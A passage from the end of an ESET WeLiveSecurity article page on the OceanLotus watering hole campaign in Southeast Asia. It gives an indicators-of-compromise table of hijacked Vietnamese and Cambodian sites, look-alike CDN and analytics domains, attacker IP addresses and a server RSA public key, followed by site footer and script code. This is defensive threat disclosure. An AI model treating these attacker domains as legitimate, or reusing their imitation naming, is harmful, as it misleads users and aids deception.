	<td class="column-1">conggiaovietnam[.]net</td><td class="column-2">lcontacts.servebbs[.]net</td><td class="column-3">178.128.219.207</td><td class="column-4">imgincapsula[.]com</td><td class="column-5">209.97.164.158</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">daichungvienvinhthanh[.]com</td><td class="column-2">sskimresources[.]com</td><td class="column-3">178.128.90.102</td><td class="column-4">secure-imrworldwide[.]com</td><td class="column-5">178.128.90.109</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">danchimviet[.]info</td><td class="column-2">wfpscripts.homeunix[.]com</td><td class="column-3">178.128.223.102</td><td class="column-4">cdn-ampproject[.]com</td><td class="column-5">178.128.24.201</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">danviet[.]vn</td><td class="column-2">cdnscr.thruhere[.]net</td><td class="column-3">178.128.98.139</td><td class="column-4">io.blogsite[.]org</td><td class="column-5">178.128.98.89</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">danviethouston[.]com</td><td class="column-2">your-ip.getmyip[.]com</td><td class="column-3">178.128.103.74</td><td class="column-4">[Unknown]</td><td class="column-5">[Unknown]</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">fvpoc[.]org</td><td class="column-2">gui.dnsdojo[.]net</td><td class="column-3">178.128.28.93</td><td class="column-4">cdnazure[.]com</td><td class="column-5">209.97.164.96</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">gardencityclub[.]com</td><td class="column-2">figbc.knowsitall[.]info</td><td class="column-3">178.128.103.207</td><td class="column-4">ichefbcci.is-a-chef[.]com</td><td class="column-5">206.189.85.162</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">lienketqnhn[.]org</td><td class="column-2">tips-renew.webhop[.]info</td><td class="column-3">159.65.7.45</td><td class="column-4">cyhire.cechire[.]com</td><td class="column-5">178.128.103.79</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">mfaic.gov[.]kh</td><td class="column-2">weblink.selfip[.]info</td><td class="column-3">178.128.103.202</td><td class="column-4">tcog.thruhere[.]net</td><td class="column-5">178.128.107.83</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">mfaic.gov[.]kh</td><td class="column-2">s0-2mdn[.]net</td><td class="column-3">104.248.144.178</td><td class="column-4">p-typekit[.]com</td><td class="column-5">104.248.144.136</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">mod.gov[.]kh</td><td class="column-2">static.tagscdn[.]com</td><td class="column-3">206.189.95.214</td><td class="column-4">pagefairjs[.]com</td><td class="column-5">159.65.137.109</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">mtgvinh[.]net</td><td class="column-2">metacachecdn[.]com</td><td class="column-3">178.128.209.153</td><td class="column-4">bootstraplink[.]com</td><td class="column-5">159.65.129.241</td>
</tr>
<tr class="row-16 even">
	<td class="column-1">nguoitieudung.com[.]vn</td><td class="column-2">s-adroll[.]com</td><td class="column-3">128.199.159.127</td><td class="column-4">player-cnevids[.]com</td><td class="column-5">128.199.159.60</td>
</tr>
<tr class="row-17 odd">
	<td class="column-1">phnompenhpost[.]com</td><td class="column-2">tiwimg[.]com</td><td class="column-3">206.189.89.121</td><td class="column-4">tiqqcdn[.]com</td><td class="column-5">206.189.47.116</td>
</tr>
<tr class="row-18 even">
	<td class="column-1">raovatcalitoday[.]com</td><td class="column-2">widgets-wp[.]com</td><td class="column-3">178.128.90.107</td><td class="column-4">cdn-tynt[.]com</td><td class="column-5">142.93.75.192</td>
</tr>
<tr class="row-19 odd">
	<td class="column-1">thongtinchongphandong[.]com</td><td class="column-2">lb-web-stat[.]com</td><td class="column-3">159.65.128.57</td><td class="column-4">benchtag2[.]com</td><td class="column-5">178.128.90.108</td>
</tr>
<tr class="row-20 even">
	<td class="column-1">tinkhongle[.]com </td><td class="column-2">cdn1.shacknet[.]us</td><td class="column-3">142.93.127.120</td><td class="column-4">scdn-cxense[.]com</td><td class="column-5">142.93.75.161</td>
</tr>
<tr class="row-21 odd">
	<td class="column-1">toithichdoc.blogspot[.]com</td><td class="column-2">assets-cdn.blogdns[.]net</td><td class="column-3">178.128.28.89</td><td class="column-4">cart.gotdns[.]com</td><td class="column-5">206.189.145.242</td>
</tr>
<tr class="row-22 even">
	<td class="column-1">trieudaiviet[.]com</td><td class="column-2">html5.endofinternet[.]net</td><td class="column-3">178.128.90.182</td><td class="column-4">effecto-azureedge[.]net</td><td class="column-5">142.93.71.92</td>
</tr>
<tr class="row-23 odd">
	<td class="column-1">triviet[.]news</td><td class="column-2">ds-aksb-a.likescandy[.]com</td><td class="column-3">159.65.137.144</td><td class="column-4">labs-apnic[.]net</td><td class="column-5">178.128.90.138</td>
</tr>
<tr class="row-24 even">
	<td class="column-1">[Unknown]</td><td class="column-2">pixel1.dnsalias[.]net</td><td class="column-3">142.93.116.157</td><td class="column-4">ad-appier[.]com</td><td class="column-5">178.128.90.66</td>
</tr>
<tr class="row-25 odd">
	<td class="column-1">[Unknown]</td><td class="column-2">trc.webhop[.]net</td><td class="column-3">178.128.90.223</td><td class="column-4">static-addtoany[.]com</td><td class="column-5">142.93.75.172</td>
</tr>
<tr class="row-26 even">
	<td class="column-1">[Unknown]</td><td class="column-2">nav.neat-url[.]com</td><td class="column-3">178.128.103.205</td><td class="column-4">straits-times.is-an-actor[.]com</td><td class="column-5">178.128.107.24</td>
</tr>
</tbody>
</table>

<h2>RSA Public Key sent by the server</h2>
<p>&#8212;&#8211;BEGIN PUBLIC KEY&#8212;&#8211;</p>
<p>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDI8O2kXpKec4MBVeF2g86GtT2X</p>
<p>/ABJB2M+urEvxJStRuL/+u/a9oJ6XL4JTFceYqJiSsXvwD/wDfgI00zCdmJ7xgw+</p>
<p>rpGyuSntLH2Ox5oVxTTUQB791WJByDjtKXYBHpIBrmePG1EcnTlfBhgHhpAeZEao</p>
<p>hEXZ94it73j02h+JtQIDAQAB</p>
<p>&#8212;&#8211;END PUBLIC KEY&#8212;&#8211;</p>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                    Matthieu Faou                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2018-11-20 14:56:03">20 Nov 2018 - 02:56PM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="OceanLotus: New watering hole attack in Southeast Asia">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="OceanLotus: New watering hole attack in Southeast Asia">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="OceanLotus: New watering hole attack in Southeast Asia">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="OceanLotus: New watering hole attack in Southeast Asia">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F11%2F20%2Foceanlotus-new-watering-hole-attack-southeast-asia%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F11%2F20%2Foceanlotus-new-watering-hole-attack-southeast-asia%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F11%2F20%2Foceanlotus-new-watering-hole-attack-southeast-asia%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"118941 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=118941","disqusShortname":"welivesecurity","disqusTitle":"OceanLotus: New watering hole attack in Southeast Asia","disqusUrl":"https:\/\/www.welivesecurity.com\/2018\/11\/20\/oceanlotus-new-watering-hole-attack-southeast-asia\/","postId":"118941"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>